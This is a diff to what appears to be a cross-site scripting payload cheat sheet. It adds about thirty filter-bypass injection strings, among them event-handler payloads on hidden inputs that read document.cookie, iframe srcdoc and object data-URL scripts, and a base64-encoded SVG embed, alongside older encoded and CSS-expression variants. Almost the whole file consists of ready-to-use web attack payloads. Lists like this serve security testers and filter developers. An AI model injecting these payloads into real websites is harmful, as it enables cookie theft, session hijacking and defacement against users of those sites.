@@ -33,22 +33,47 @@
 <TABLE><TD BACKGROUND="javascript:alert('XSS')">
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 <div/onmouseover='alert(1)'> style="x:">
-
 <--`<img/src=` onerror=alert(1)> --!>
- <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+"><input type="hidden" oncontentvisibilityautostatechange="alert(document.cookie)" style="content-visibility:auto">
+"><input type="hidden" oncontentvisibilityautostatechange="alert(document.domain)" style="content-visibility:auto">
+"><div style="width:100px;height:100px" onpointerenter="alert('Bypassed')">Hover me</div>
+"><iframe srcdoc="<script>confirm('Bypassed')</script>"></iframe>
+"><div style="visibility:visible;" onmouseover="confirm('Bypassed')">Hover over me</div>
+"><img src=x onerror="&#99;&#111;&#110;&#102;&#105;&#114;&#109;('Bypassed')">
+"><form><button formaction="javascript:confirm('Bypassed')">Click Me</button></form>
+"><input type="text" oncut="alert('Bypassed')" onpaste="alert('Bypassed')">
+"><div onfocusin="confirm('Bypassed')"><input type="text" autofocus></div>
+"><details ontoggle="confirm('Bypassed')"><summary>Click to open</summary></details>
+"><details ontoggle="document.querySelector('input[type=hidden]').focus(); confirm('Bypassed')"><summary>Click to open</summary><input type="hidden" onfocus="confirm('Hidden Bypassed')" style="display:none;" autofocus></details>
+<div onmouseover="alert('XSS on hover')">Hover here</div>
+"><svg onload="alert('Bypassed XSS')"></svg>
+"><input type="text" onfocus="alert('Focus Bypassed')" autofocus>
+"><div style="width:100px;height:100px" onclick="alert('Clicked!')">Click me</div>
+"><iframe srcdoc="<img src=1 onerror='alert(`XSS`)'>" width=100 height=100></iframe>
+"><a href="javascript:alert('Link Bypassed')" style="display:block;">Click here</a>
+"><textarea autofocus onfocus="alert('Textarea Bypassed')"></textarea>
+"><video src=x onerror="alert('Video Error')"></video>
+"><select onchange="alert('Select Bypassed')"><option>Option 1</option><option>Option 2</option></select>
+"><button onclick="alert('Button Click Bypassed')">Click Me</button>
+"><embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoQnlwYXNzZWQpPg==" type="image/svg+xml" />
+"><img src="x" onerror="document.body.innerHTML='<h1>Bypassed XSS</h1>'">
+"><marquee onstart="alert('Marquee Bypassed')">Text</marquee>
+"><div onclick="setTimeout(()=>alert('Timeout Bypassed'), 1000)">Delayed Click</div>
+"><object data="data:text/html,<script>alert('XSS in Object')</script>"></object>
+"><input type="checkbox" onchange="alert('Checkbox Bypassed')" checked>
+"><iframe src="javascript:confirm('Iframe Bypassed')"></iframe>
+"><audio src=x onerror="alert('Audio Bypassed')"></audio>
+"><input type="button" value="Click" onclick="alert('Button Clicked Bypassed')">
+"><img src="x" onerror="this.srcdoc='<script>alert(`Image Error Bypassed`)</script>'">
 
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 <div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
-
 "><img src=x onerror=window.open('https://www.google.com/');>
-
 <form><button formaction=javascript&colon;alert(1)>CLICKME
-
 <math><a xlink:href="//jsfiddle.net/t846h/">click
-
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
-
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
-
 <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 <DIV STYLE="width: expression(alert('XSS'));">
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
